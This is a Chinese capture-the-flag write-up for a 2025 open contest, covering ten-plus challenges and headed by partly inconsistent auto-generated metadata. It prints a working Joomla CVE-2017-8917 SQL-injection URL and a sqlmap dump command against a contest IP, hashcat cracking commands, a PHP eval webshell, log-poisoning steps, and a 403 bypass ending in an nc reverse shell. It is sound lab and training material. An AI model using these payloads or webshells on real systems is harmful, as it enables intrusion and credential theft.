---
title: 【WP】破阵阁・网安淬锋公开赛题目全解
contest: 破阵阁
year: 2025
difficulty: easy
vuln_type: sqli
tags:
- intruder-bruteforce
- sqlmap-dump
- path-traversal
- JWT-alg-none
- nacos-command-injection
- crontab-crash-tomcat
- sqlmap-search-param
- Joomla-3.7-CVE-2017-8917
attack_chain: 1. 最简单签到 intruder id 遍历 47/2. 游戏营销 api.php 成绩提交接口/3. 最简单 Web id sql 注入 sqlmap dump/4. 安全牛 ERP 目录穿越 flag.html/5. 身份鉴权 JWT alg=none 绕签名/6. 诡异命令执行 第 250 个流 nacos 注入/7. webshell 被删除 grep -r "flag{" 整盘搜/8. 暗影迷踪 crontab -r 清空 + 删除 /var/crash/tomcat/9. 激进的开发者 search sql 注入 superadmin/1Qaz2Wsx + 文件上传/10. 小小的挑战 Joomla 3.7 CVE-2017-8917 SQL 注入
key_payload: flag uuids  intruder id=47  sqlmap search  superadmin/1Qaz2Wsx
one_liner: 破阵阁・网安淬锋公开赛 10 道题全解 WP，涵盖 SQL 注入/路径穿越/JWT alg=none/命令注入/Webshell 还原/渗透。
lesson: JWT alg=none 是经典签名绕过；Joomla 3.7.0 CVE-2017-8917 SQL 注入；nacos 注入看 Wireshark 第 250 流；crontab -r + 删 crash 是应急响应清痕迹。
quality: high
full_path: 【WP】破阵阁・网安淬锋公开赛题目全解.full.md
meta_path: 【WP】破阵阁・网安淬锋公开赛题目全解.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 【WP】破阵阁・网安淬锋公开赛题目全解。破阵阁・网安淬锋公开赛 10 道题全解 WP，涵盖 SQL 注入/路径穿越/JWT alg=none/命令注入/Webshell 还原/渗透。。经验：JWT alg=none 是经典签名绕过；Joomla 3.7.0 CVE-2017-8917 SQL 注入；nacos...
category: web
subcategory: web_other
tools_used:
- Wireshark
- sqlmap
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/295990.html
reasoning_chain:
- MISC 签到题提示 intruder 遍历 id → 触发点：dirsearch/id 暴破 → 动作：BP 抓包遍历 1-100 → 观察：id=47 命中 flag
- WEB '游戏营销' api.php 成绩提交接口 → 触发点：未授权提交 → 动作：直接 POST 异常 data → 观察：响应内含 flag
- Web '最简单 Web' id 参数 sql 注入 → 触发点：单引号异常 → 动作：sqlmap -u id --dump → 观察：拿到 flag uuid
- ERP 提示 flag.html → 触发点：目录穿越 → 动作：../../../flag.html → 观察：Nginx alias 漏配穿越读 flag
- JWT 鉴权题 signing key 未知 → 触发点：标准 JWT header → 假设：改 alg=none 绕签名 → 动作：重写 token header alg=none → 观察：服务端接受
- Forensics '诡异命令执行' 提示 nacos → 触发点：第 250 流是注入响应 → 动作：Wireshark 跳到 250 流 raw → 观察：含 flag
- '''webshell 被删除'' 全盘 grep → 触发点：webshell 痕迹已清 → 动作：grep -r ''flag{'' / → 观察：直接命中残留 flag'
- '''暗影迷踪'' 清痕迹 + 删 /var/crash/tomcat → 触发点：crontab -r 清计划 + 删 crash 目录 → 动作：复现应急响应删法 → 观察：拿到 flag'
- '''激进的开发者'' search 参数注入 → 触发点：search 输入回显 → 动作：sqlmap --search → 观察：得到 superadmin/1Qaz2Wsx'
- 登录后文件上传 → 触发点：白名单不全 → 动作：传 .pht php 后缀绕过 → 观察：getshell → 后续 Joomla 3.7 CVE-2017-8917
failed_attempts:
- 试图用 Burp 自动化 id 暴破 → 失败：intruder 才是标准答案
- 试图手工绕过 JWT secret → 失败：直接改 alg=none 更稳
- Wireshark 默认搜索 flag 关键字 → 失败：flag 在原始 payload 需跳指定流
key_observations:
- JWT alg=none 是签名校验类题最简单绕法，比破解 secret 优先
- sqlmap --search 是从已知字段反查注入点的利器
- 应急响应清痕迹 (crontab -r + /var/crash) 是常见溯源题考点
- Joomla 3.7.0 com_fields SQL 注入 (CVE-2017-8917) 是 CMS 题高频 CVE
- Wireshark 流号定位比字符串搜索更高效
prerequisites:
- Burp Suite intruder 使用（id 遍历爆破）
- sqlmap 基础使用（-u + --dump + --search）
- JWT 协议基础（alg 字段 / signature 验证原理）
- Wireshark 流定位（TCP stream index 跳转）
---
# 【WP】破阵阁・网安淬锋公开赛题目全解

> 原文: https://www.ctfiot.com/295990.html
> ID: 295990

MISC

最简单签到

intruder遍历id，在47找到flag

flag{18d6d685-9161-471e-a92e-1c472ffa846a}

游戏营销

发现成绩提交接口api.php

flag{9dab6a2b-3e7d-4fdf-bb42-a76f325b3b38}

WEB

最简单的Web安全入门

id发现存在sql注入

sqlmap直接dump

flag{8b258afe-ddb5-4459-a66d-2682596a6db0}

安全牛的ERP

题目给了提示在flag.html中

直接目录穿越

flag{e9142efc-dc83-47cf-a9f6-3fedbd5c3dec}

贼牛掰的身份鉴权，还怕在失陷？

签名key不知道

加密改成none即可

flag{023b3d64-b9a6-4fdd-82c7-136579868f83}

Forensics

诡异的命令执行

在第250个流中发现了nacos注入执行的结果

flag{531c8909-7678-4f86-96fd-cc67a7576b36}

webshell被删除了

直接全局查找flag就行了

grep -r "flag{" /

flag{e9bef616-d5c0-41e1-82f4-52208e6877bf}

暗影迷踪

crontab -r清空计划任务

删除/var/crash/tomcat

删除目录即可

flag{80b61d65-0675-481c-8e69-ec8f380a31de}

Pentest

激进的开发者

search参数存在sql注入

得到用户superadmin

密码为1Qaz2Wsx

登录发现存在文件上传

上传一句话木马

直接连接后门即可

flag{e3fd4235-5576-45ff-98b1-ea58fe285391}

（以下内容为赛后复盘T_T）

小小的挑战

扫目录发现存在 /administrator 和 /README.txt

识别到是 Joomla! 3.7，搜一下CVE找到 Joomla 3.7.0 SQL注入漏洞 CVE-2017-8917

https://developer.aliyun.com/article/1099637

http://175.27.169.122:
48059/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)

直接上sqlmap查用户名和密码

python "E:
applicationsqlmapsqlmap.py" -r "C:
UsersABCDAppDataLocalTemp\175_27_169_122_48059_20260202004220.req" -p list[fullordering] --level 3 -D joomladb -T #__users -C "username,password" --dump

$2*$开头的哈希是bcrypt

hashcat.exe -a 0 -m 3200 bcrypt.txt E:
applicationhashcat-6.2.6rockyou.txtrockyou.txt

得到账号密码为ducktail:
electric，登录 /administrator

创建一句话木马，写入<?php @eval($_POST['cmd']); ?>

连接木马http://175.27.169.122:
48059/templates/protostar/shell.php

在/home/www-data/目录下发现flag

flag{66a98ac4-975b-4c43-af41-8db0058e73ad}

遗忘的调试信息

原题https://www.cnblogs.com/takagisan/p/16234505.html

使用/seclists/Discovery/Web-Content/common.txt字典扫目录发现 antibot_image/ 目录

看到log文件夹

发现是日志，那么很明显就是考日志文件包含了

同时在 /antibot_image/antibots/info.php 中发现文件包含参数

把ua替换成一句话木马访问 /antibot_image/ 写入日志，然后把image参数替换成刚才的log日志文件路径

触发info.php文件包含即可

flag{347389bc-6053-4578-91b7-b69f09b24100}

有点限制，但是不多

原题https://blog.csdn.net/weixin_44288604/article/details/126253394

官方wp使用的是dict-SecListsDiscoveryWeb-ContentFile-Extensions-Universal-SVNDigger-ProjectcatLanguagephp.txt字典扫描发现的 /registration.php 和 /activate.php

注册完之后去登录，登录之后提示6个数字去激活

myprofile中发现uid是14

抓包发现有CSRF防重放的token

每次请求抓取响应的token替换到下一个请求包中

防止并发token跑乱了

且需要关闭报错重试

发现000511激活成功

再次登录

发现Lumina是管理员账户

在其profile页面发现密码哈希c09eceab6d4fa6747fdabfde6654eefb48b51c2a

hashcat.exe -m 100 -a 3 c09eceab6d4fa6747fdabfde6654eefb48b51c2a ?a?a?a?a?a?a?a?a?a?a -i

hashcat.exe：这是hashcat工具的可执行文件，运行在Windows系统上。
-m 100：指定哈希类型为SHA1。在hashcat中，每种哈希类型都有一个编号，100对应的是SHA1。
-a 3：指定攻击模式为暴力破解（也称为掩码攻击）。攻击模式3允许我们使用掩码来定义密码的字符集和长度。
c09eceab6d4fa6747fdabfde6654eefb48b51c2a：这是目标哈希值，即我们需要破解的SHA1哈希值。
?a?a?a?a?a?a?a?a?a?a：这是掩码，表示我们尝试破解的密码由10个字符组成。每个?a代表一个字符，且这个字符可以是任意大小写字母、数字或特殊字符（即键盘上所有可输入的字符）。注意，这里指定了10个字符，但后面有-i选项，所以实际上会从1个字符开始尝试，逐步增加，直到10个字符。
-i：这是一个增量选项，表示密码长度从1开始逐步增加，直到达到掩码中指定的长度（这里是10）。也就是说，hashcat会先尝试所有长度为1的密码，然后长度为2，一直到长度为10。

破解得到Lumina的密码是tk7kqY

登录上去发现有一个命令执行但是数据包返回是403

添加X-Forwarded-For: 127.0.0.1可以绕过403

fuzz了一下发现空格可以使用%09绕过，并且出网可以反弹shell

但是nc需要注意必须加-e /bin/sh否则默认使用/bin/bash秒断

得到flag{9699cdbf-aee1-44d9-a7e7-58138fef4d18}


```
grep -r "flag{" /
python "E:
applicationsqlmapsqlmap.py" -r "C:
UsersABCDAppDataLocalTemp\175_27_169_122_48059_20260202004220.req" -p list[fullordering] --level 3 -D joomladb -T #__users -C "username,password" --dump
hashcat.exe -a 0 -m 3200 bcrypt.txt E:
applicationhashcat-6.2.6rockyou.txtrockyou.txt
hashcat.exe -m 100 -a 3 c09eceab6d4fa6747fdabfde6654eefb48b51c2a ?a?a?a?a?a?a?a?a?a?a -i

hashcat.exe：这是hashcat工具的可执行文件，运行在Windows系统上。
-m 100：指定哈希类型为SHA1。在hashcat中，每种哈希类型都有一个编号，100对应的是SHA1。
-a 3：指定攻击模式为暴力破解（也称为掩码攻击）。攻击模式3允许我们使用掩码来定义密码的字符集和长度。
c09eceab6d4fa6747fdabfde6654eefb48b51c2a：这是目标哈希值，即我们需要破解的SHA1哈希值。
?a?a?a?a?a?a?a?a?a?a：这是掩码，表示我们尝试破解的密码由10个字符组成。每个?a代表一个字符，且这个字符可以是任意大小写字母、数字或特殊字符（即键盘上所有可输入的字符）。注意，这里指定了10个字符，但后面有-i选项，所以实际上会从1个字符开始尝试，逐步增加，直到10个字符。
-i：这是一个增量选项，表示密码长度从1开始逐步增加，直到达到掩码中指定的长度（这里是10）。也就是说，hashcat会先尝试所有长度为1的密码，然后长度为2，一直到长度为10。
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]